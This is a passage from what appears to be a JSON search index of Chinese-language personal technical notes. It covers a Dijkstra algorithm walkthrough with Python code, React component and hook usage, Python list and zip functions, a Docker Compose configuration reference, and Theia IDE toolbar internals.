7（0 -> 1 距离为 2，1 -> 3 距离为 5）。 现在得到了到相邻节点的距离，需要选择一个节点添加到路径中。\n我们必须 选择一个已知到源节点距离最短的未访问节点 。\n即选择 Distance 中未确定最小值. 从距离列表中可以看出，距离为 6 的节点 2 就是我们的选择： 在图中为它加上红色边框，并将路径上的边标记为红色： 在距离列表中用红色方块把它标记为\"已访问\"，在\"未访问\"节点列表中把它划掉： 重复前面的步骤，寻找源节点到新的相邻节点节点 3 的最短路径。 可以看到，有两种可选的路径： 0 -> 1 -> 3 或 0 -> 2 -> 3 。一起看看我们是如何确定最短路径的。 节点 3 在之前已经有了一个距离记录（距离为 7，参阅下表），\n这个距离是之前步骤中由路径 0 -> 1 -> 3 的两个边权重（分别为 5 和 2）相加得到的。 不过现在有了一个新的可选路径： 0 -> 2 -> 3 ，它途经权重分别为 6 和 8 的两条边 0 -> 2 和 2 -> 3 ，总距离为 14。 显然，第一个路径的距离更短（7 vs. 14），\n所以选择第一个路径 0 -> 1 -> 3 。只有在新的路径距离更短的情况下，才会更新距离列表。 因此，使用第一种方案 0 -> 1 -> 3 ，将节点添加到路径中。 把这个节点标记为\"已访问\"，在\"未访问\"节点列表中把它划掉： 重复前面的过程。 检查尚未访问的相邻节点：节点 4 和节点 5，因为它们是节点 3 的相邻节点。 更新它们到源节点的距离，尝试寻找更短的路径： 对于节点 4： 路径是 0 -> 1 -> 3 -> 4 ，距离为 17。 对于节点 5： 路径是 0 -> 1 -> 3 -> 5 ，距离为 22。 注解 我们只能从最短路径（红色边）上进行扩展，\n而不能途经未被包含在最短路径中的边（例如，不能构造经过边 2 -> 3 的路径）。 现在需要选择将哪个未访问节点标记为\"已访问\"，这里选择节点 4，因为在距离列表中它的距离最短。在图中做标记： 在距离列表中用红色方块将它标记为\"已访问\"： 在\"未访问\"节点列表中把它划掉： 再次重复前面的过程。检查相邻节点：节点 5 和节点 6。分析每一种从已访问节点到它们之间的可能路径方案。 对于节点 5： 第一种选择是路径 0 -> 1 -> 3 -> 5 ，到源节点的距离为 22（2 + 5 + 15），前面的步骤已经记录了这个距离。 第二种选择是路径 0 -> 1 -> 3 -> 4 -> 5 ，到源节点的距离为 23（2 + 5 + 10 + 6）。 显然，第一个路径距离更短，为节点 5 选择第一种方案。 对于节点 6： 可选的路径是 0 -> 1 -> 3 -> 4 -> 6 ，到源节点的距离为 19（2 + 5 + 10 + 2）。 把距离最短（当前已知）的节点 6 标记为\"已访问\"。 在\"未访问\"节点列表中把它划掉： 现在得到了如下路径（标记为红色）： 现在只剩下一个节点 5 还没被访问了，看看我们要如何把它添加到路径中。 从已经添加到路径中的节点出发，有三种不同的路径可以访问节点 5： 第一种选择： 0 -> 1 -> 3 -> 5 ，总距离为 22（2 + 5 + 15）。 第二种选择： 0 -> 1 -> 3 -> 4 -> 5 ，总距离为 23（2 + 5 + 10 + 6）。 第三种选择： 0 -> 1 -> 3 -> 4 -> 6 -> 5 ，总距离为 25（2 + 5 + 10 + 2 + 6）。 选择总距离为 22 的最短路径： 0 -> 1 -> 3 -> 5 。 把这个节点标记为\"已访问\"，并在\"未访问\"节点列表中把它划掉： 瞧！ 我们得到了从节点 0 到图中每个节点的最短路径。 图中，标记为红色的边表示最短路径：连接节点 0 和目标节点的红色边即为从源节点出发访问目标节点的最短路径。 例如，想要从节点 0 出发访问节点 6，连接它们的红色边就是最短路径，跟着走就行了。 上述例子Python实现 from math import inf from typing import List class Solution : def find ( self , n : int , edges : List [ List [ int ]]) -> list : # 将 edges 转换为 图 g = [[ inf ] * n for _ in range ( n )] for x , y , d in edges : g [ x ][ y ] = d g [ y ][ x ] = d # inf 当前已寻找好距离, # False 是否作为必须点被寻找 # 索引直接表示点 0 - n-1 dis = [( inf , False )] * n # 到自己的距离为0 dis [ 0 ] = ( 0 , False ) while any ( not x [ 1 ] for x in dis ): x = - 1 cur_d = inf for i , ( d , al_find ) in enumerate ( dis ): # 找出当前 未访问 中最小的 if not al_find and d < cur_d : x = i cur_d = d # if x == -1: break # 最后一个点的时候, 肯定已经有其他点先遍历过了(双向点), 所以可以直接退出 if x == n - 1 : break # 标记为 当必经过当前点时 已找过 dis [ x ] = ( dis [ x ][ 0 ], True ) for y , d in enumerate ( g [ x ]): if d == inf or dis [ y ][ 1 ]: continue # 不可达 或者 已经找过, 跳过 new_d = d + dis [ x ][ 0 ] if new_d < dis [ y ][ 0 ]: dis [ y ] = ( new_d , False ) return [ x [ 0 ] for x in dis ] if __name__ == '__main__' : dd = Solution () . find ( 7 , [ [ 0 , 1 , 2 ], [ 0 , 2 , 6 ], [ 1 , 3 , 5 ], [ 2 , 3 , 8 ], [ 3 , 5 , 15 ], [ 3 , 4 , 10 ], [ 4 , 5 , 6 ], [ 4 , 6 , 2 ], [ 5 , 6 , 6 ], ] ) print ( dd ) 补充一个使用堆优化的. import heapq def find_with_heap ( self , n : int , edges : List [ List [ int ]]): \"\"\"使用堆优化\"\"\" # 将 edges 转换为 图 g = [[ inf ] * n for _ in range ( n )] for x , y , d in edges : g [ x ][ y ] = d g [ y ][ x ] = d dis = [ inf ] * n dis [ 0 ] = 0 # 第一个 0 表示 点0到点0的举例为0, # 第二个 0 表示 点0 h = [( 0 , 0 )] while h : # 拿到的是 d 最小的, 堆比直接循环节省时间 d , x = heapq . heappop ( h ) # 这个时候拿到的 点 x 就已经是确定最小的了 # 堆优化不用记状态, 是因为出堆后就已经被确定为最小的了 # if d > dis[x]: #     continue for y , d in enumerate ( g [ x ]): if d == inf : continue # 不可达 或者 已经找过, 跳过 new_d = d + dis [ x ] if new_d < dis [ y ]: dis [ y ] = new_d heapq . heappush ( h , ( new_d , y )) return dis 堆优化不用记访问状态, 是因为出堆后就已经被确定为最小的了. 至于会不会访问到上一个访问的结点, 比如 0->1 后 1->0 的时候, 为什么不会一直递归重复?\n因为当重复访问的时候, 路径长度也会变成原来的两倍, 会被 new_d < dis[y] 过滤掉. new_d = d + dis [ x ] if new_d < dis [ y ]: ... 比如 0-1 距离为 2, 第一次, 更新节点 0 相邻的数据状态: dis[0] = 0      (已访问过)\ndis[1] = 2\ndis[2] = 6 下一次找最小的, 也就是 节点 1, 当考虑 1->0 时: # 即 y==1\nnew_d = d + dis[x]\n# 结果为\n# new_d = d + dis[0]\n# 4 = 2 + 2 这个时候判断 new_d < dis[y]\n# 即\n# 4 < dis[0]\n# 4 < 0 是不成立的, 也就避免了一直循环下去 参考:: 图文详解 Dijkstra 最短路径算法 https://www.cnblogs.com/goldsunshine/p/12978305.html , 这个还没仔细看, 浅浏览了感觉图比较全, 本地见: ../../../resources/pdf/一篇文章讲透Dijkstra最短路径算法 - 金色旭光 - 博客园.pdf","tags":"数据结构","url":"/yq-docs-data-structure-Greedy-algorithm-Dijkstra-(Dijiestra)-algorithm.html","loc":"/yq-docs-data-structure-Greedy-algorithm-Dijkstra-(Dijiestra)-algorithm.html"},{"title":"Component","text":"类组件定义必须继承其, 并至少实现启动的 render() 方法. 原型: React.Component<P, S> P 是 组件接受的类型, S 表示当前组件的 state 类型 接口方法/函数 componentDidMount() 相当于函数组件中的 useEffect 的第一个参数，用于在组件挂载后执行操作。 componentDidUpdate(prevProps, prevState) 相当于函数组件中使用 useEffect 时的 useEffect 第二个参数，用于在属性或状态更新后执行操作。 如 componentDidUpdate ( prevProps , prevState ) { // 检查 count 状态是否发生变化 if ( this . state . count !== prevState . count ) { console . log ( 'Count has changed:' , this . state . count ); // 执行其他操作，例如发送网络请求或更新其他组件 } } componentWillUnmount() 相当于函数组件中使用 useEffect 返回的清理函数，用于在组件卸载之前执行清理操作。","tags":"前端","url":"/yq-docs-front-end-frame-react-API-Component.html","loc":"/yq-docs-front-end-frame-react-API-Component.html"},{"title":"createRef","text":"与 函数组件 的 useRef 基本一致. 支持类组件和函数组件. 注解 准确的说, 仅支持类组件, 因为 createRef 在函数组件中\n并没有 Hooks 的效果，其值会随着 FunctionComponent 重复执行而不断被初始化 为什么 createRef 可以在 ClassComponent 正常运行呢？\n这是因为 ClassComponent 分离了生命周期，使例如 componentDidMount 等初始化时机仅执行一次。 React的数据流是自上而下的,\n意味着如果想要从父组件更新自组件,\n只有更新 Props 再触发重新渲染. 而 Ref 可以创建一个子组件的引用, 给父组件直接调用. 注解 Props 是单向数据流，以 声明式 渲染组件；Ref 则是以 命令式 操作组件。 命令式: 打破了 Props 的单向数据流，直接操作子元素。 从 React16.3 开始, 官方提供了 createRef: class Parent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.myRef = React.createRef();\n  }\n\n  componentDidMount() {\n    const node = this.myRef.current;\n    // 使用 ref 对象\n  }\n\n  render() {\n    return <div ref={this.myRef}>Ref Example</div>;\n  }\n} ref可以直接指向定义的变量名, 但是使用的时候, 需要额外加个 current 才能获取当前引用实例. 重要 ref不能挂到一个函数式组件 重要 因为命令式破坏了原先的数据流，所以请不要滥用 Ref 可以使用 Props 完成的，建议优先使用声明式的Props。\n例如：我们写一个\"对话框组件\"，最好使用 isOpen 属性控制开关，而不是暴露 close() 和 open() 方法。 注解 React 会在组件挂载时给 current 属性传入 DOM 元素，\n并在组件卸载时传入 null 值。\nref 会在 componentDidMount 或 componentDidUpdate 生命周期钩子触发前更新。\n这就是为什么ref.current总能拿到最新值的原因 不使用createRef ref需要手动赋值: class MyComponent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.myRef = null;\n  }\n\n  componentDidMount() {\n    const node = this.myRef;\n    // 使用 ref 对象\n  }\n\n  render() {\n    return <div ref={ref => (this.myRef = ref)}>Ref Example</div>;\n  }\n} 效果感觉差不多.","tags":"前端","url":"/yq-docs-front-end-frame-react-hooks-Createe.html","loc":"/yq-docs-front-end-frame-react-hooks-Createe.html"},{"title":"自定义Hook","text":"举个例子，我们写一个 hook 实时获取页面的宽度: // 创建一个名为useWidth的hook\nfunction useWidth () {\n  // 1. 声明一个宽度的state\n  const [width, setWidth] = useState(window.innerWidth);\n  useEffect(() => {\n    function handleResize() {\n      // 2. 每当屏幕resize时，更新width\n      setWidth(window.innerWidth);\n    }\n\n    // 3. 添加监听事件\n    window.addEventListener(\"resize\", handleResize);\n    // 4. 返回一个移出事件的函数\n    return () => window.removeEventListener(\"resize\", handleResize);\n  }, []);\n  return width;\n} 使用: function App () {\n  // 使用自定义hook\n  const width = useWidth();\n  return <div>当前屏幕宽度为{width}</div>\n} 自定义的useWidth，实时获取屏幕宽度\n另外，很重要的几点提示： hook在各个组件中的state状态是隔离的，这个跟js函数的概念是一致的； React Hooks不是用来在多组件中复用状态，而是在多组件中复用状态逻辑；","tags":"前端","url":"/yq-docs-front-end-frame-react-hooks-Custom-HOOK.html","loc":"/yq-docs-front-end-frame-react-hooks-Custom-HOOK.html"},{"title":"useState","text":"为组件添加 State 例子: import React, { useState } from 'react';\n\nfunction Example() {\n  // 声明一个state count\n  const [count, setCount] = useState(0);\n\n  // 使用count进行渲染，并绑定点击时间，使count+1\n  return (\n    <div>\n      <p>You clicked {count} times</p>\n      <button onClick={() => setCount(count + 1)}>\n        Click me\n      </button>\n    </div>\n  );\n} setCount 的触发是异步的 注解 当有多个state时，使用多个state变量，而不是一个,\n这样把无关逻辑分离，便于增删改state 同时, 如果因为UI界面的更新, 需要做一些操作, 同时这个操作需要用到state变量,\n那么建议 将此操作放到 useEffect 中, 避免不能获取最新的state值. 另外, 貌似, 在类中的 state 是一直存在的, 不会因为触发而清空, 函数组件中不确定....\n后面有空测试一下","tags":"前端","url":"/yq-docs-front-end-frame-react-hooks-usestate.html","loc":"/yq-docs-front-end-frame-react-hooks-usestate.html"},{"title":"ref类型不匹配","text":"大致报错信息: MutableRefObject<SelectComponent | undefined> is not assignable to type Ref<SelectComponent> | undefined 或者: Type ForwardedRef<unknown> is not assignable to type LegacyRef<SelectComponent> | undefined 原因: 在 React 中，ref 可以是两种类型之一：LegacyRef 或 MutableRefObject。 LegacyRef 是一个旧版本的 ref 类型，适用于类组件和函数组件。 MutableRefObject 是一个较新的 ref 类型，适用于函数组件和 React Hooks。\n如果你在函数组件中使用 useRef() 创建 ref，那么你得到的是 MutableRefObject 类型的对象。 但是，类组件中的 ref 应该是 LegacyRef 类型。 这个时候需要将其转换一下, 比如: import {SelectComponent, SelectComponentProps} from \"@theia/core/lib/browser/widgets/select-component\"\nimport * as React from \"react\";\n\nconst ForwardedChildComponent = React.forwardRef((props: SelectComponentProps, ref) => {\n    return <SelectComponent {...props} ref={ref as React.RefObject<SelectComponent>} />;\n});","tags":"前端","url":"/yq-docs-front-end-frame-react-question-Ref-type-does-not-match.html","loc":"/yq-docs-front-end-frame-react-question-Ref-type-does-not-match.html"},{"title":"list","text":"index()方法 检测 字符串 中是否包含子字符串 str，并返回索引值；\n从 列表 中找出某个值第一个匹配项的索引位置。 list 求交集并集差集 不建议的: # 假设有两个集合 a,b\n# 交集\n[val for val in a if val in b]\n# 并集\nlist(set(a+b))\n# 差集\n[val for val in b if val not in a]    # b中有而a中没有的 建议的高效的: # 假设有两个集合 a,b\n# 交集\nlist(set(a).intersection(set(b)))\n# 并集\nlist(set(a).union(set(b)))\n# 差集\nlist(set(b).difference(set(a)))       # b中有而a中没有的 见 set 求其中某值的个数 使用 count, 如: In [23]: [1, 2, 3].count(3)\nOut[23]: 1","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-list.html","loc":"/yq-docs-rear-end-python-Built--in-function-list.html"},{"title":"zip","text":"注解 相似的函数见 itertools 的 zip_longest <Python_zip_longest> zip() 函数用于将可迭代的对象作为参数，将对象中对应的元素打包成一个个元组，然后返回由这些元组组成的列表。 zip 方法在 Python 2 和 Python 3 中的不同：\n在 Python 3.x 中为了减少内存，zip() 返回的是一个对象。如需展示列表，需手动 list() 转换。 zip([iterable, ...]) iterable -- 一个或多个迭代器; 返回元组列表 如果各个迭代器的元素个数不一致，则返回列表长度与最短的对象相同，利用 * 号操作符，可以将元组解压为列表: >>> a = [1,2,3]\n>>> b = [4,5,6]\n>>> c = [4,5,6,7,8]\n>>> zipped = zip(a,b)     # 返回一个对象\n>>> zipped\n<zip object at 0x103abc288>\n>>> list(zipped)  # list() 转换为列表\n[(1, 4), (2, 5), (3, 6)]\n>>> list(zip(a,c))              # 元素个数与最短的列表一致\n[(1, 4), (2, 5), (3, 6)]\n\n>>> a1, a2 = zip(*zip(a,b))          # 与 zip 相反，zip(*) 可理解为解压，返回二维矩阵式\n>>> list(a1)\n[1, 2, 3]\n>>> list(a2)\n[4, 5, 6]\n>>>","tags":"后端; python","url":"/yq-docs-rear-end-python-Built--in-function-zip.html","loc":"/yq-docs-rear-end-python-Built--in-function-zip.html"},{"title":"Docker Compose","text":"简介 Compose 是用于定义和运行多容器 Docker 应用程序的工具。\n通过 Compose，您可以使用 YML 文件来配置应用程序需要的所有服务。\n然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。 Compose 使用的三个步骤： 使用 Dockerfile 定义应用程序的环境。 使用 docker-compose.yml 定义构成应用程序的服务，这样它们可以在隔离环境中一起运行。 最后，执行 docker-compose up 命令来启动并运行整个应用程序。 如: # yaml 配置实例\nversion: '3'\nservices:\n  web:\n    build: .\n    ports:\n   - \"5000:5000\"\n    volumes:\n   - .:/code\n    - logvolume01:/var/log\n    links:\n   - redis\n  redis:\n    image: redis\nvolumes:\n  logvolume01: {} 安装 可以直接去 github 下载: https://github.com/docker/compose/releases 其实现在, 如果是桌面端, 比如MacOS, 安装的 docker 图形界面就自带 docker-compose: ll /usr/local/bin/docker-compose\nlrwxr-xr-x@ 1 yanque  admin    62B Dec  6  2022 /usr/local/bin/docker-compose -> /Applications/Docker.app/Contents/Resources/bin/docker-compose 指令选项 -d 后台启动 -f 指定配置文件, 不指定时默认为 docker-compose.yml 常用指令 # 以当前目录下的 docker-compose.yml 文件来后台启动应用 $ docker-compose up -d # 指定当前目录下 docker-compose-me.yml 文件来后台启动应用 $ docker-compose -f docker-compose-me.yml up -d # 停止并删除所有容器 $ docker-compose down # 停止指定应用 appName 是需要停止的容器名 $ docker-compose stop appName 准备 创建一个简单的 flask 应用: $ mkdir composetest\n$ cd composetest 在测试目录中创建一个名为 app.py 的文件，并复制粘贴以下内容: import time\n\nimport redis\nfrom flask import Flask\n\napp = Flask(__name__)\ncache = redis.Redis(host='redis', port=6379)\n\n\ndef get_hit_count():\n    retries = 5\n    while True:\n        try:\n            return cache.incr('hits')\n        except redis.exceptions.ConnectionError as exc:\n            if retries == 0:\n                raise exc\n            retries -= 1\n            time.sleep(0.5)\n\n\n@app.route('/')\ndef hello():\n    count = get_hit_count()\n    return 'Hello World! I have been seen {} times.\\n'.format(count) 在此示例中，redis 是应用程序网络上的 redis 容器的主机名，该主机使用的端口为 6379。\n在 composetest 目录中创建另一个名为 requirements.txt 的文件，内容如下: flask\nredis 创建 dockerfile 说明见 dockerfile编写 当前测试内容: FROM python:3.7-alpine\nWORKDIR /code\nENV FLASK_APP app.py\nENV FLASK_RUN_HOST 0.0.0.0\nRUN apk add --no-cache gcc musl-dev linux-headers\nCOPY requirements.txt requirements.txt\nRUN pip install -r requirements.txt\nCOPY . .\nCMD [\"flask\", \"run\"] 解释 FROM python:3.7-alpine: 从 Python 3.7 映像开始构建镜像。 WORKDIR /code: 将工作目录设置为 /code。 ENV FLASK_APP app.py\nENV FLASK_RUN_HOST 0.0.0.0 设置 flask 命令使用的环境变量。 RUN apk add --no-cache gcc musl-dev linux-headers: 安装 gcc，以便诸如 MarkupSafe 和 SQLAlchemy 之类的 Python 包可以编译加速。 COPY requirements.txt requirements.txt\nRUN pip install -r requirements.txt 复制 requirements.txt 并安装 Python 依赖项。 COPY . .: 将 . 项目中的当前目录复制到 . 镜像中的工作目录。 CMD [\"flask\", \"run\"]: 容器提供默认的执行命令为：flask run。 创建 docker-compose.yml 在测试目录中创建一个名为 docker-compose.yml 的文件，然后粘贴以下内容: # yaml 配置\nversion: '3'\nservices:\n  web:\n    build: .\n    ports:\n      - \"5000:5000\"\n  redis:\n    image: \"redis:alpine\" 该 Compose 文件定义了两个服务：web 和 redis。 web：该 web 服务使用从 Dockerfile 当前目录中构建的镜像。然后，它将容器和主机绑定到暴露的端口 5000。此示例服务使用 Flask Web 服务器的默认端口 5000 。 redis：该 redis 服务使用 Docker Hub 的公共 Redis 映像。 使用 Compose 命令构建和运行您的应用 在测试目录中，执行以下命令来启动应用程序: docker-compose up 如果你想在后台执行该服务可以加上 -d 参数: docker-compose up -d yml 配置指令参考 version 指定本 yml 依从的 compose 哪个版本制定的。 build 指定为构建镜像上下文路径： 例如 webapp 服务，指定为从上下文路径 ./dir/Dockerfile 所构建的镜像: version: \"3.7\"\nservices:\n  webapp:\n    build: ./dir 或者，作为具有在上下文指定的路径的对象，以及可选的 Dockerfile 和 args: version: \"3.7\"\nservices:\n  webapp:\n    build:\n      context: ./dir\n      dockerfile: Dockerfile-alternate\n      args:\n        buildno: 1\n      labels:\n        - \"com.example.description=Accounting webapp\"\n        - \"com.example.department=Finance\"\n        - \"com.example.label-with-empty-value\"\n      target: prod context：上下文路径。 dockerfile：指定构建镜像的 Dockerfile 文件名。 args：添加构建参数，这是只能在构建过程中访问的环境变量。 labels：设置构建镜像的标签。 target：多层构建，可以指定构建哪一层。 cap_add，cap_drop 添加或删除容器拥有的宿主机的内核功能。 cap_add: ALL # 开启全部权限 cap_drop: SYS_PTRACE # 关闭 ptrace权限 cgroup_parent 为容器指定父 cgroup 组，意味着将继承该组的资源限制: cgroup_parent: m-executor-abcd command 覆盖容器启动的默认命令: command: [\"bundle\", \"exec\", \"thin\", \"-p\", \"3000\"] container_name 指定自定义容器名称，而不是生成的默认名称: container_name: my-web-container depends_on 设置依赖关系。 docker-compose up ：以依赖性顺序启动服务。在以下示例中，先启动 db 和 redis ，才会启动 web。 docker-compose up SERVICE ：自动包含 SERVICE 的依赖项。在以下示例中，docker-compose up web 还将创建并启动 db 和 redis。 docker-compose stop ：按依赖关系顺序停止服务。在以下示例中，web 在 db 和 redis 之前停止。 如: version: \"3.7\"\nservices:\n  web:\n    build: .\n    depends_on:\n      - db\n      - redis\n  redis:\n    image: redis\n  db:\n    image: postgres 注意：web 服务不会等待 redis db 完全启动 之后才启动。 deploy 指定与服务的部署和运行有关的配置。只在 swarm 模式下才会有用: version: \"3.7\"\nservices:\n  redis:\n    image: redis:alpine\n    deploy:\n      mode：replicated\n      replicas: 6\n      endpoint_mode: dnsrr\n      labels:\n        description: \"This redis service label\"\n      resources:\n        limits:\n          cpus: '0.50'\n          memory: 50M\n        reservations:\n          cpus: '0.25'\n          memory: 20M\n      restart_policy:\n        condition: on-failure\n        delay: 5s\n        max_attempts: 3\n        window: 120s 可选参数 endpoint_mode 访问集群服务的方式: endpoint_mode: vip\n# Docker 集群服务一个对外的虚拟 ip。所有的请求都会通过这个虚拟 ip 到达集群服务内部的机器。\nendpoint_mode: dnsrr\n# DNS 轮询（DNSRR）。所有的请求会自动轮询获取到集群 ip 列表中的一个 ip 地址。 labels 在服务上设置标签。可以用容器上的 labels（跟 deploy 同级的配置） 覆盖 deploy 下的 labels。 mode：指定服务提供的模式。 replicated：复制服务，复制指定服务到集群的机器上。 global：全局服务，服务将部署至集群的每个节点。 图解：下图中黄色的方块是 replicated 模式的运行情况，灰色方块是 global 模式的运行情况。 replicas mode 为 replicated 时，需要使用此参数配置具体运行的节点数量。 resources 配置服务器资源使用的限制，例如上例子，配置 redis 集群运行需要的 cpu 的百分比 和 内存的占用。避免占用资源过高出现异常。 restart_policy 配置如何在退出容器时重新启动容器。 condition：可选 none，on-failure 或者 any（默认值：any）。 delay：设置多久之后重启（默认值：0）。 max_attempts：尝试重新启动容器的次数，超出次数，则不再尝试（默认值：一直重试）。 window：设置容器重启超时时间（默认值：0）。 rollback_config 配置在更新失败的情况下应如何回滚服务。 parallelism：一次要回滚的容器数。如果设置为0，则所有容器将同时回滚。 delay：每个容器组回滚之间等待的时间（默认为0s）。 failure_action：如果回滚失败，该怎么办。其中一个 continue 或者 pause（默认pause）。 monitor：每个容器更新后，持续观察是否失败了的时间 (ns|us|ms|s|m|h)（默认为0s）。 max_failure_ratio：在回滚期间可以容忍的故障率（默认为0）。 order：回滚期间的操作顺序。其中一个 stop-first（串行回滚），或者 start-first（并行回滚）（默认 stop-first ）。 update_config 配置应如何更新服务，对于配置滚动更新很有用。 parallelism：一次更新的容器数。 delay：在更新一组容器之间等待的时间。 failure_action：如果更新失败，该怎么办。其中一个 continue，rollback 或者pause （默认：pause）。 monitor：每个容器更新后，持续观察是否失败了的时间 (ns|us|ms|s|m|h)（默认为0s）。 max_failure_ratio：在更新过程中可以容忍的故障率。 order：回滚期间的操作顺序。其中一个 stop-first（串行回滚），或者 start-first（并行回滚）（默认stop-first）。 注：仅支持 V3.4 及更高版本。 devices 指定设备映射列表: devices:\n  - \"/dev/ttyUSB0:/dev/ttyUSB0\" dns 自定义 DNS 服务器，可以是单个值或列表的多个值: dns: 8.8.8.8\n\ndns:\n  - 8.8.8.8\n  - 9.9.9.9 dns_search 自定义 DNS 搜索域。可以是单个值或列表: dns_search: example.com\n\ndns_search:\n  - dc1.example.com\n  - dc2.example.com entrypoint 覆盖容器默认的 entrypoint: entrypoint: /code/entrypoint.sh 也可以是以下格式: entrypoint:\n    - php\n    - -d\n    - zend_extension=/usr/local/lib/php/extensions/no-debug-non-zts-20100525/xdebug.so\n    - -d\n    - memory_limit=-1\n    - vendor/bin/phpunit env_file 从文件添加环境变量。可以是单个值或列表的多个值: env_file: .env 也可以是列表格式: env_file:\n  - ./common.env\n  - ./apps/web.env\n  - /opt/secrets.env environment 添加环境变量。您可以使用数组或字典、任何布尔值，\n布尔值需要用引号引起来，以确保 YML 解析器不会将其转换为 True 或 False: environment:\n  RACK_ENV: development\n  SHOW: 'true' expose 暴露端口，但不映射到宿主机，只被连接的服务访问。\n仅可以指定内部端口为参数: expose:\n- \"3000\"\n- \"8000\" extra_hosts 添加主机名映射。类似 docker client --add-host: extra_hosts:\n- \"somehost:162.242.195.82\"\n- \"otherhost:50.31.209.229\" 以上会在此服务的内部容器中 /etc/hosts 创建一个具有 ip 地址和主机名的映射关系: 162.242.195.82  somehost\n50.31.209.229   otherhost healthcheck:: 用于检测 docker 服务是否健康运行: healthcheck:\n  test: [\"CMD\", \"curl\", \"-f\", \"http://localhost\"] # 设置检测程序\n  interval: 1m30s # 设置检测间隔\n  timeout: 10s # 设置检测超时时间\n  retries: 3 # 设置重试次数\n  start_period: 40s # 启动后，多少秒开始启动检测程序 image 指定容器运行的镜像。以下格式都可以: image: redis\nimage: ubuntu:14.04\nimage: tutum/influxdb\nimage: example-registry.com:4000/postgresql\nimage: a4bc65fd # 镜像id logging 服务的日志记录配置 driver 指定服务容器的日志记录驱动程序，默认值为json-file。有以下三个选项 driver: \"json-file\" driver: \"syslog\" driver: \"none\" 仅在 json-file 驱动程序下，可以使用以下参数，限制日志得数量和大小: logging:\n  driver: json-file\n  options:\n    max-size: \"200k\" # 单个文件大小为200k\n    max-file: \"10\" # 最多10个文件 当达到文件限制上限，会自动删除旧得文件。 syslog 驱动程序下，可以使用 syslog-address 指定日志接收地址: logging:\n  driver: syslog\n  options:\n    syslog-address: \"tcp://192.168.0.42:123\" network_mode 设置网络模式: network_mode: \"bridge\"\nnetwork_mode: \"host\"\nnetwork_mode: \"none\"\nnetwork_mode: \"service:[service name]\"\nnetwork_mode: \"container:[container name/id]\" networks\n配置容器连接的网络，引用顶级 networks 下的条目 services:\n  some-service:\n    networks:\n      some-network:\n        aliases:\n        - alias1\n      other-network:\n        aliases:\n        - alias2\nnetworks:\n  some-network:\n    # Use a custom driver\n    driver: custom-driver-1\n  other-network:\n    # Use a custom driver which takes special options\n    driver: custom-driver-2 aliases ：同一网络上的其他容器可以使用服务名称或此别名来连接到对应容器的服务。 restart no：是默认的重启策略，在任何情况下都不会重启容器。 always：容器总是重新启动。 on-failure：在容器非正常退出时（退出状态非0），才会重启容器。 unless-stopped：在容器退出时总是重启容器，但是不考虑在Docker守护进程启动时就已经停止了的容器 如: restart: \"no\"\nrestart: always\nrestart: on-failure\nrestart: unless-stopped 注：swarm 集群模式，请改用 restart_policy。 secrets 存储敏感数据，例如密码: version: \"3.1\"\nservices:\n\nmysql:\n  image: mysql\n  environment:\n    MYSQL_ROOT_PASSWORD_FILE: /run/secrets/my_secret\n  secrets:\n    - my_secret\n\nsecrets:\n  my_secret:\n    file: ./my_secret.txt security_opt 修改容器默认的 schema 标签: security-opt：\n  - label:user:USER   # 设置容器的用户标签\n  - label:role:ROLE   # 设置容器的角色标签\n  - label:type:TYPE   # 设置容器的安全策略标签\n  - label:level:LEVEL  # 设置容器的安全等级标签 stop_grace_period 指定在容器无法处理 SIGTERM (或者任何 stop_signal 的信号)，等待多久后发送 SIGKILL 信号关闭容器: stop_grace_period: 1s # 等待 1 秒\nstop_grace_period: 1m30s # 等待 1 分 30 秒 默认的等待时间是 10 秒。 stop_signal 设置停止容器的替代信号。默认情况下使用 SIGTERM 。\n以下示例，使用 SIGUSR1 替代信号 SIGTERM 来停止容器: stop_signal: SIGUSR1 sysctls 设置容器中的内核参数，可以使用数组或字典格式: sysctls:\n  net.core.somaxconn: 1024\n  net.ipv4.tcp_syncookies: 0\n\nsysctls:\n  - net.core.somaxconn=1024\n  - net.ipv4.tcp_syncookies=0 tmpfs 在容器内安装一个临时文件系统。可以是单个值或列表的多个值: tmpfs: /run\n\ntmpfs:\n  - /run\n  - /tmp ulimits 覆盖容器默认的 ulimit: ulimits:\n  nproc: 65535\n  nofile:\n    soft: 20000\n    hard: 40000 volumes 将主机的数据卷或着文件挂载到容器里: version: \"3.7\"\nservices:\n  db:\n    image: postgres:latest\n    volumes:\n      - \"/localhost/postgres.sock:/var/run/postgres/postgres.sock\"\n      - \"/localhost/data:/var/lib/postgresql/data\" 参考: 菜鸟教程","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-docker-compose.html","loc":"/yq-docs-Container-and-cluster-docker-docker-compose.html"},{"title":"资源管理器工作区按钮","text":"node_modules/@theia/workspace/src/browser/workspace-commands.ts 的 WorkspaceCommands 基本上定义完了 触发定义在 WorkspaceCommandContribution","tags":"前端","url":"/yq-docs-front-end-frame-theia-Technical-realization-Resource-Manager-Work-Area-button.html","loc":"/yq-docs-front-end-frame-theia-Technical-realization-Resource-Manager-Work-Area-button.html"},{"title":"工具栏更多","text":"资源管理器的工具栏的更多 node_modules/@theia/core/src/browser/shell/tab-bar-toolbar/tab-bar-toolbar.tsx 的 TabBarToolbar 下的 registerMoreToolbarItem : // More (...) toolbar items.\nthis.registerMoreToolbarItem({\n    id: FileNavigatorCommands.TOGGLE_AUTO_REVEAL.id,\n    command: FileNavigatorCommands.TOGGLE_AUTO_REVEAL.id,\n    tooltip: FileNavigatorCommands.TOGGLE_AUTO_REVEAL.label,\n    group: NavigatorMoreToolbarGroups.TOOLS,\n});\nthis.registerMoreToolbarItem({\n    id: WorkspaceCommands.ADD_FOLDER.id,\n    command: WorkspaceCommands.ADD_FOLDER.id,\n    tooltip: WorkspaceCommands.ADD_FOLDER.label,\n    group: NavigatorMoreToolbarGroups.WORKSPACE,\n}); 那三个点实现在 node_modules/@theia/core/src/browser/shell/tab-bar-toolbar/tab-bar-toolbar.tsx 的 TabBarToolbar 下 renderMore : protected renderMore(): React.ReactNode {\n    return !!this.more.size && <div key='__more__' className={TabBarToolbar.Styles.TAB_BAR_TOOLBAR_ITEM + ' enabled'}>\n        <div id='__more__' className={codicon('ellipsis', true)} onClick={this.showMoreContextMenu}\n            title={nls.localizeByDefault('More Actions...')} />\n    